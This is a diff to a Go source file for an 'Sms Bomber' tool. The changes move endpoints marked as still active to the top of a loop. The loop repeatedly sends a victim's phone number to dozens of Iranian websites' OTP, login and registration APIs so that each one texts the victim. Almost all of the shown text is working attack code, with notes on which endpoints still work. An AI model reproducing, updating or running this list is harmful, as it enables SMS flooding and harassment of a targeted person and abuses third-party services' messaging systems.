@@ -12,9 +12,8 @@ import (
 )
 
 /*
-Channel telegram : none
 ===============================================
-Link Github : https://github.com/monsmain
+Link Github : https://github.com/monsmain    
 ===============================================
 Sms Bomber faster
 */
@@ -74,9 +73,9 @@ func main() {
            .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
             #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
             -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
-             *@@%#            -@@@@@@.            #@@@+             
+            *@@%#             -@@@@@@.            #@@@+             
              .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
-              :@@*           =%@@@@@@%-   faster   *@@:              
+             :@@*            =%@@@@@@%-  faster    *@@:              
               #@@%         .*@@@@#%@@@%+.         %@@+              
               %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
 `)
@@ -108,6 +107,34 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
+		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
+			"phone": phone,
+		}, ch)  //active✅
+		go sms("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  //active✅
+		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
+		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
+			s15: phone,
+		}, ch)  //active✅
+		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
+			"mobile": phone,
+		}, ch)     //active✅
+		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
+			"username": phone,
+		}, ch)    //active✅
+		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
+		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
+			"mobile": phone,
+		}, ch)    //active✅
+		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
+			"phone": phone,
+		}, ch)   //active✅
+		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
+			"phone": phone,
+		}, ch)    //active✅
 		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
 			"receptorPhone": phone,
 		}, ch)  //ofline site = error 504
@@ -145,9 +172,6 @@ func main() {
 		go sms("https://api.zarinplus.com/user/otp/", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)  // edit & Alternative :4/22/2025
-		go sms("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
-			"phone": phone,
-		}, ch)  //active✅
 		se := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
 		go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
 			se: phone,
@@ -195,13 +219,6 @@ func main() {
 		go sms("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
 			"username": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
-			"mobile": phone,
-		}, ch)     //active✅
-		s15 := fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone)
-		go sms("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
-			s15: phone,
-		}, ch)    //active✅
 		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
@@ -209,9 +226,6 @@ func main() {
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
   //delete site from domain
-		go sms("https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
-			"mobile": phone,
-		}, ch)     //active✅
  //delete site from domain
 		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
 			"contact": phone,
@@ -249,12 +263,6 @@ func main() {
 		go sms("https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
-		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
-			"username": phone,
-		}, ch)    //active✅
-		go sms("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
-			"phone": phone,
-		}, ch)    //active✅
 		go sms("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{
 			"identifier": phone,
 		}, ch)
@@ -333,9 +341,6 @@ func main() {
 		go sms("https://mobogift.com/signin", map[string]interface{}{
 			"username": phone,
 		}, ch)
-		go sms("https://api.iranicard.ir/api/v1/register", map[string]interface{}{
-			"mobile": phone,
-		}, ch)    //active✅
 		go sms("https://tj8.ir/auth/register", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
@@ -357,9 +362,6 @@ func main() {
 		go sms("https://www.delino.com/user/register", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
-		go sms("https://alopeyk.com/api/sms/send.php", map[string]interface{}{
-			"phone": phone,
-		}, ch)   //active✅
 		go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
 			"Mobile": phone,
 		}, ch)
@@ -402,9 +404,6 @@ func main() {
 		go sms("https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)
-		go sms("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
-			"phone": phone,
-		}, ch)    //active✅
 		go sms("https://api.dadhesab.ir/user/entry", map[string]interface{}{
 			"username": phone,
 		}, ch)
